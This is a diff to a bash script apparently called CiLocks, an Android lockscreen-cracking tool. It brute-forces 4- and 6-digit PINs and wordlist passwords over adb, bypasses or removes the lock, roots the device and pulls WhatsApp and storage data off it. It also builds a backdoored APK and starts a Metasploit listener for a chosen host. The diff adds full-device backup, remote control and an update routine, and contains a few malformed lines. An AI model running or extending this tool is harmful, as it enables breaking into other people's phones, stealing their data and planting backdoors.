@@ -9,15 +9,16 @@ lh="\e[1;32m" # hijau terang
 lb="\e[1;34m" # langit biru
 n="\e[0m" # netral
 w="\e[1;37m" # putih tebal
+
 clear
 [[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo -e ${m} "You must be root to run the script${n}"; echo ; exit 1; }
 path=$(pwd)
 name='cilocks'
+version="v1.2"
 function files() {
   file=$path/$name
   bash $file
 }
-clear
 function banner() {
 
 echo -e "${lb}
@@ -25,30 +26,89 @@ echo -e "${lb}
   / ____(_) /   ____  _____/ /_______
  / /   / / /   / __ \/ ___/ //_/ ___/
 / /___/ / /___/ /_/ / /__/ ,< (__  )
-\____/_/_____/\____/\___/_/|_/____/
+\____/_/_____/\____/\___/_/|_/____/$version
 ${n}"
 echo -e "${m}   Crack Interface LockScreen${n}"
 echo -e "${lb}      LoliC0d3 - Tegal1337${n}"
 }
-banner
-echo -e "${lh}
-1.Update
-2.Brute Pin 4 Digit
-3.Brute Pin 6 Digit
-4.Brute LockScreen Using Wordlist
-5.Bypass LockScreen {Antiguard} Not Support All OS Version
-6.Root Android {Supersu} Not Support All OS Version
-7.Jump To Adb Toolkit
-8.Reset Data
-9.Remove LockScreen {Root}
-10.Jump To Metasploit
-99.Exit
-${n}"
-read -p "senpai@tegalsec:~# " select
+
+# function menu() {
+#   clear
+#   banner
+#   home
+# }
+lanip=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/')
+lanip6=$(ip addr | grep 'state UP' -A4 | tail -n1 | awk '{print $2}' | cut -f1 -d'/')
+publicip=$(dig +short myip.opendns.com @resolver1.opendns.com)
+# host=$(host "$publicip" | awk '{print $5}' | sed 's/.$//')
+#####os
+source data/os
+sleep 1
+function os() {
+  banner
+echo -e "${m}        Detect Your OS ${n}"
+}
+os
+sleep 0.5
+echo "Kernel: "$(uname)
+sleep 0.5
+echo $(lsb_release -i)
+sleep 0.5
+echo $(lsb_release -c)
+sleep 0.5
+echo "Your IP Address: "$lanip
+sleep 3
+# echo "Your IP Address (Ipv6): "$lanip6
+# sleep 0.5
+# echo "Your IP Address (Public): "$host
+# sleep 0.5
+clear
+function config() {
+  banner
+echo -e "${m}    Detect Installed Package ${n}"
+}
+config
+source data/config
+clear
+# banner
+  clear
+  banner
+  echo -e "${lh}
+  1.Update
+  2.Brute Pin 4 Digit
+  3.Brute Pin 6 Digit
+  4.Brute LockScreen Using Wordlist
+  5.Bypass LockScreen {Antiguard} Not Support All OS Version
+  6.Root Android {Supersu} Not Support All OS Version
+  7.Jump To Adb Toolkit
+  8.Reset Data
+  9.Remove LockScreen {Root}
+  10.Jump To Metasploit
+  11.Control Android {Scrcpy}
+  12.Phone Info
+  99.Exit
+  ${n}"
+  read -p "senpai@tegalsec:~# " select
 if [[ $select == 1 ]]; then
-    echo "This Latest Version!"
+  remove old version
+  rm -f "${path}/cilocks" >/dev/null 2>&1
+  rm -f "${path}/data/config" >/dev/null 2>&1
+  rm -f "${path}/data/os" >/dev/null 2>&1
+  # update new release
+  wget https://raw.githubusercontent.com/tegal1337/CiLocks/main/cilocks -O "${path}/cilocks" >/dev/null 2>&1
+  wget https://raw.githubusercontent.com/tegal1337/CiLocks/main/data/config -O "${path}/data/config" >/dev/null 2>&1
+  wget https://raw.githubusercontent.com/tegal1337/CiLocks/main/data/os -O "${path}/data/os" >/dev/null 2>&1
+  # give permission
+  chmod +x "${path}/cilocks" >/dev/null 2>&1
+  chmod +x "${path}/data/config" >/dev/null 2>&1
+  chmod +x "${path}/data/os" >/dev/null 2>&1
+  echo "Done!"
+  echo "Restart Cilocks..."
+  sleep 3
+  files
+
 elif [[ $select == 2 ]]; then
-  #adb shell input keyevent 26 #Pressing the lock button
+  adb shell input keyevent 26 #Pressing the lock button
   adb shell input keyevent 82
 
   echo "Brute Pin 4 Digit"
@@ -71,7 +131,7 @@ elif [[ $select == 2 ]]; then
   done
 
 elif [[ $select == 3 ]]; then
-  # adb shell input keyevent 26 #Pressing the lock button
+  adb shell input keyevent 26 #Pressing the lock button
   adb shell input keyevent 82
 
   echo "Brute Pin 6 Digit"
@@ -101,7 +161,7 @@ elif [[ $select == 3 ]]; then
   done
 
 elif [[ $select == 4 ]]; then
-  # adb shell input keyevent 26 #Pressing the lock button
+  adb shell input keyevent 26 #Pressing the lock button
   adb shell input keyevent 82
   echo "Brute LockScreen Using Wordlist"
   read -p "list -> " files
@@ -177,8 +237,13 @@ elif [[ $select == 7 ]]; then
 4.Copy All WhatsApp Folder
 5.Copy All Data Storage
 6.Manual Copy {Costum}
+7.Backup Data
+8.Restore Data
+9.Permissons Reset
+10.Reboot
 99.Menu
 ${n}  "
+fpath="backup"
 read -p "senpai@tegalsec:~# " select
   if [[ $select == 1 ]]; then
       echo "Opening Shell..."
@@ -221,6 +286,14 @@ read -p "senpai@tegalsec:~# " select
       paths=$path/$dir
       adb pull $pathz $paths
       echo "Your File Saved In $paths "
+    elif [[ $select == 7 ]]; then
+      adb backup -apk -shared -all -f $fpath/backup.ab
+    elif [[ $select == 8 ]]; then
+      adb restore $fpath/backup.ab“
+    elif [[ $select == 9 ]]; then
+      adb shell pm reset-permissions
+    elif [[ $select == 10 ]]; then
+      adb reboot &> /dev/null
     elif [[ $select == 99 ]]; then
     files
     fi
@@ -338,7 +411,7 @@ Listener
     xterm -T " CiLocks Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"
 
   fi
-elif [[ $select == 4 ]]; then
+  elif [[ $select == 4 ]]; then
   path="backdoor"
   loli="loli.apk"
   read -p "Enter LHOST: " host
@@ -357,14 +430,43 @@ elif [[ $select == 4 ]]; then
   # jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $path/key.keystore $paths hacked
   # jarsigner -verify -verbose -certs $paths
   # zipalign -v 4 $paths $path'/'$app'.apk'
-  # milf=$path/$app'.apk'
-  # rm $paths
+  milf=$path/$app'.apk'
+  rm $paths
   # rm $path/key.keystore
   echo "Your Backdoor Created In" $milf
 elif [[ $select == 99 ]]; then
-    files
+files
 fi
 
+elif [[ $select == 11 ]]; then
+  scrcpy
+elif [[ $select == 12 ]]; then
+  # function info() {
+  #   banner
+  #   echo -e "${m}           Phone Info${n}"
+  # }
+  # clear
+  # info
+  # echo -e "${lh}
+  # 1.Phone Info
+  # 2.
+  # 99.Menu
+  # ${n}"
+  # read -p "senpai@tegalsec:~# " select
+  # if [[ $select == 1 ]]; then
+  manu=$(adb shell getprop ro.product.manufacturer)
+  model=$(adb shell getprop ro.product.model)
+  version=$(adb shell getprop ro.build.version.release )
+  sdk=$(adb shell getprop ro.build.version.sdk )
+  info=$(printf "%s %s %s (API %s)" "$manu" "$model" "$version" "$sdk")
+  echo "Info: " $info
+  echo "Manufacturer: " $manu
+  echo "Model: " $model
+  echo "Version: " $version
+  echo "Sdk: " $sdk
+  # elif [[ $select == 99 ]]; then
+  #   files
+  # fi
 elif [[ $select == 99 ]]; then
     echo "oke"
 
